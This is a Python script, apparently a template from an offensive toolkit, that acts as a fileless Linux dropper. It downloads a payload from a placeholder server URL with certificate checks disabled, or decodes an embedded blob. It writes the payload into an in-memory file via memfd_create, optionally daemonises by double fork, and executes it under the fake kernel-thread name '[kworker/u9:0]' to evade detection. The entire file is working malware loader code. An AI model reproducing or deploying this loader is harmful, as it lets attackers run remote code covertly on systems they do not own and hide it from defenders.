#!/usr/bin/env python3
import base64
import ctypes
import os
import ssl
import urllib.request
import zlib

# credits:
# https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# https://0x00sec.org/t/super-stealthy-droppers/3715/9
# https://blog.fbkcs.ru/elf-in-memory-execution/
# https://www.wiz.io/blog/pyloose-first-python-based-fileless-attack-on-cloud-workloads

# payload, can be a URL or a zlib compressed and base64 encoded blob
PAYLOAD = '{{ SRVURL }}'

# fork to background
DAEMONIZE = False

# disguise as kernel process
MEMFD_NAME = '1'
PROCESS_NAME = '[kworker/u9:0]'

# ---

assert os.name == 'posix'

# from /usr/include/linux/memfd.h
MFD_CLOEXEC = 0x0001

# from /usr/include/asm/unistd_64.h and /usr/include/asm/unistd_32.h
SYSCALL_MAP = dict(
    x86_64=319,
    i386=279,
    arm64=385,
)

# detect architecture
try:
    NR_MEMFD_CREATE = SYSCALL_MAP[os.uname().machine]
except KeyError:
    exit(1)

# call memfd_create(name, flags)
fd = ctypes.CDLL(None).syscall(NR_MEMFD_CREATE, MEMFD_NAME, MFD_CLOEXEC)

# download without checking https certificates
if PAYLOAD.startswith('http://') or PAYLOAD.startswith('https://'):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with urllib.request.urlopen(PAYLOAD, context=ctx) as res:
        os.write(fd, res.read())
else:
    os.write(fd, zlib.decompress(base64.b64decode(PAYLOAD)))

if DAEMONIZE:
    # double fork
    pid = os.fork()
    if pid != 0:
        exit()
    os.setsid()
    pid = os.fork()
    if pid != 0:
        exit()

# execute payload
os.execl('/proc/self/fd/{}'.format(fd), PROCESS_NAME)
